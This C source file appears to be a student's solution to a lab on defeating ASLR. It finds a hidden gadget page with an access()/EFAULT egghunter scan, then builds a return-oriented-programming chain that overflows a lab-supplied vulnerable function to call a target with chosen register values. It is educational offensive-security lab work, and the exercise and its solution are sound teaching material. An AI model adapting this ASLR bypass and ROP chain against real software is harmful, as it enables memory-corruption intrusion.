/*
 * Address Space Layout Randomization
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <time.h>
#include <mmintrin.h>
#include <xmmintrin.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include "lab.h"

// Same as in Part 2
extern void vulnerable(char *your_string);
extern void call_me_maybe(uint64_t rdi, uint64_t rsi, uint64_t rdx);

// Your code:
uint64_t find_address(uint64_t low_bound, uint64_t high_bound);
void do_overflow(uint64_t page_addr);

static bool is_candidate_page(uint64_t addr) {
    errno = 0;

    /* Same egghunter trick as Part 1A: mapped pages do not raise EFAULT. */
    if (access((const char *)addr, F_OK) == 0) {
        return true;
    }

    return errno != EFAULT;
}

uint64_t find_address(uint64_t low_bound, uint64_t high_bound) {
    if (low_bound >= high_bound) {
        return 0;
    }

    /* Scan page-by-page until we find the hidden RX page that stores the gadgets. */
    for (uint64_t addr = low_bound; addr < high_bound; addr += PAGE_SIZE) {
        if (is_candidate_page(addr)) {
            return addr;
        }
    }

    return 0;
}

/*
 * do_overflow
 * Construct the ROP chain and execute it using the gadgets we found by breaking ASLR.
 */
void do_overflow(uint64_t page_addr) {
    uint64_t your_string[128];

    /*
     * gadgets.gold is mapped as one page. The gadget offsets are fixed
     * inside that page, so once we recover the page base we can rebuild
     * the absolute gadget addresses by adding their known offsets.
     */
    uint64_t gadget1_addr = page_addr + 0x00;
    uint64_t gadget2_addr = page_addr + 0x10;
    uint64_t gadget3_addr = page_addr + 0x20;
    uint64_t gadget4_addr = page_addr + 0x30;
    uint64_t gadget5_addr = page_addr + 0x40;
    uint64_t gadget6_addr = page_addr + 0x50;
    uint64_t call_me_maybe_addr = (uint64_t)&call_me_maybe;

    memset(your_string, 0xFF, sizeof(your_string));
    your_string[127] = 0x000000000000000A;

    /*
     * Part 3 target:
     *   (rdi & 0x04) != 0
     *   rsi == 8 * rdi
     *   rdx == 93599359
     *
     * Build it as follows:
     *   gadget3               => rdi = 0
     *   gadget5 x4            => rdi = 4
     *   gadget6               => rsi = 4
     *   gadget2 x3            => rsi = 8 * 4 = 32
     *   gadget1 + 13371337    => rax = 13371337
     *   gadget4               => rdx = rax * 7 = 93599359
     *   call_me_maybe         => validates (4, 32, 93599359)
     */
    your_string[0] = 0xFFFFFFFFFFFFFFFF;
    your_string[1] = 0xFFFFFFFFFFFFFFFF;
    your_string[2] = 0xFFFFFFFFFFFFFFFF;
    your_string[3] = gadget3_addr;
    your_string[4] = gadget5_addr;
    your_string[5] = gadget5_addr;
    your_string[6] = gadget5_addr;
    your_string[7] = gadget5_addr;
    your_string[8] = gadget6_addr;
    your_string[9] = gadget2_addr;
    your_string[10] = gadget2_addr;
    your_string[11] = gadget2_addr;
    your_string[12] = gadget1_addr;
    your_string[13] = 13371337;
    your_string[14] = gadget4_addr;
    your_string[15] = call_me_maybe_addr;

    vulnerable((char *)your_string);

}

/*
 * lab_code
 * This is called by main with the bounds for the hidden page, just
 * like in Part 1. You will locate the page and then execute a ROP
 * chain using payloads located in the page.
 */
void lab_code(uint64_t low_bound, uint64_t high_bound) {
    /* First defeat ASLR to locate the gadget page, then launch the ROP chain. */
    uint64_t found_page = find_address(low_bound, high_bound);
    do_overflow(found_page);
}
